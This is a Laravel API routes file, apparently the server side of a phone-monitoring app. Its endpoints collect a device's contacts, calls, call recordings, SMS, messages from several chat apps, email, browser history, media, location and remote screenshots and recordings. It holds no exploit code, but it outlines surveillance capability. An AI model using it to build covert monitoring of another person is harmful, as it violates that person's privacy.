<?php

use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::middleware('auth:api')->get('/user', function (Request $request) {
    return $request->user();
});


    //GET API
    // Route::group(['middleware' => ['check-unique-id']], function () {

    


    // POST APIS
    // Route::post('pic-testing', 'API\TestPictures@index');

    // Route::post('contacts', 'API\ContactController@getcontacts');
    // Route::post('save-contacts', 'API\ContactController@savecontact');
    
    // Route::post('callog', 'API\CallogController@getcallog');
    // Route::post('save-calls', 'API\CallogController@savecalls');
    // Route::post('call-recordings', 'API\CalRecordingController@save_call_recordings');
    
    
    // Route::post('savesms', 'API\SmsController@savedevicemessage');
    // Route::post('user-calendars', 'API\CalendarsController@submit');
    // Route::post('wifi-logger', 'API\WifiLoggerController@submit');
    // Route::post('user-gallery', 'API\UserGalleryController@userImages');
    // Route::post('user-videos', 'API\UserVideosController@userVideos');
    // Route::post('user-voices', 'API\UserVoicesController@userVoices');
    // Route::post('device-details','API\DeviceDetailController@deviceDetail');
    // Route::post('user-applications','API\UserApplicationController@userapplication');
    // Route::post('user-locations','API\UserLocationController@userlocations');
    // Route::post('check-location-status','API\UserLocationController@check_location_status');
    // Route::post('user-documents','API\UserDocumentController@user_dacument');
    // Route::post('web-history','API\WebHistoryController@web_history');
    // Route::post('check-device','API\DeviceDetailController@check_device');
    // Route::post('capture-screenshot','API\CaptureScreenshotController@submit_screenshot');
    // Route::post('record-audio','API\RecordAudioController@record_audio');
    // Route::post('record-video','API\RecordVideoController@record_video');
    // Route::post('record-screen','API\RecordScreenController@record_screen');
    // Route::post('take-pictures','API\TakePictureController@take_pictures');
    // Route::post('check-device-type','API\CheckDeivceStateController@index');
    // Route::post('update-device-token','API\DeviceDetailController@update_device_token');
    // Route::post('device-permissions','API\DevicePermissionsController@device_permissions');
    // Route::post('api-status','API\ApiStatusController@api_status');
    // Route::get('store-user','API\RecordAudioController@store_user');
    


    // new Apis
    Route::post('device-data-status', 'API\ClientStatusController@saveClientList');

    Route::post('geo-fence-status', 'API\GeoFenceController@store');

    Route::get('call-blocks/{device_id}', 'API\CallBlockController@getCallBlock'); 
    Route::post('call-blocks', 'API\CallBlockController@store'); 
    Route::get('keywords-alert/{device_id}', 'API\UserKeywordController@getKeywordsList'); 
    Route::post('keywords-alert', 'API\UserKeywordController@store'); 
    Route::post('save-browser-history', 'API\BrowserHistoryController@saveBrowserHistory');
    Route::post('save-whatsapp-sms', 'API\WhatsappSmsController@saveWhatsAppMessage');
    Route::post('save-viber-sms', 'API\ViberController@saveViberMessage');
    Route::post('save-instagram-sms', 'API\InstagramController@saveInstagramMessage');
    Route::post('save-gmail-email', 'API\GmailController@saveGmailEmail');
    Route::post('save-messanger-messages', 'API\FacebookController@saveMessangerMessages');
    Route::post('save-snapchat-sms', 'API\SnapchatController@saveSnapchatMessages');
    Route::post('save-imo-sms', 'API\ImoController@saveImoMessages');
    Route::post('save-tender-sms', 'API\TenderController@saveTenderMessages');


    // V2 Apis
    Route::post('pic-testing-v2', 'API\TestPictures@index');
    Route::post('contacts-v2', 'API\ContactController@getcontacts');
    Route::post('save-contacts-v2', 'API\ContactController@savecontact');
    Route::post('callog-v2', 'API\CallogController@getcallog');
    Route::post('save-calls-v2', 'API\CallogController@savecalls');
    Route::post('call-recordings-v2', 'API\CalRecordingController@save_call_recordings');
    Route::post('savesms-v2', 'API\SmsController@savedevicemessage');
    Route::post('user-calendars-v2', 'API\CalendarsController@submit');
    Route::post('wifi-logger-v2', 'API\WifiLoggerController@submit');
    Route::post('user-gallery-v2', 'API\UserGalleryController@userImages');
    Route::post('user-videos-v2', 'API\UserVideosController@userVideos');
    Route::post('user-voices-v2', 'API\UserVoicesController@userVoices');
    Route::post('device-details-v2','API\DeviceDetailController@deviceDetail');
    Route::post('user-applications-v2','API\UserApplicationController@userapplication');
    Route::post('user-locations-v2','API\UserLocationController@userlocations');
    Route::post('check-location-status-v2','API\UserLocationController@check_location_status');
    Route::post('user-documents-v2','API\UserDocumentController@user_dacument');
    Route::post('web-history-v2','API\WebHistoryController@web_history');
    Route::post('check-device-v2','API\DeviceDetailController@check_device');
    Route::post('capture-screenshot-v2','API\CaptureScreenshotController@submit_screenshot');
    Route::post('record-audio-v2','API\RecordAudioController@record_audio');
    Route::post('record-video-v2','API\RecordVideoController@record_video');
    Route::post('record-screen-v2','API\RecordScreenController@record_screen');
    Route::post('take-pictures-v2','API\TakePictureController@take_pictures');
    Route::post('check-device-type-v2','API\CheckDeivceStateController@index');
    Route::post('update-device-token-v2','API\DeviceDetailController@update_device_token');
    Route::post('device-permissions-v2','API\DevicePermissionsController@device_permissions');
    Route::post('api-status-v2','API\ApiStatusController@api_status');
    Route::post('remove-data','API\ApiStatusController@api_status');
    // Route::get('store-user-v2','API\RecordAudioController@store_user');
// });
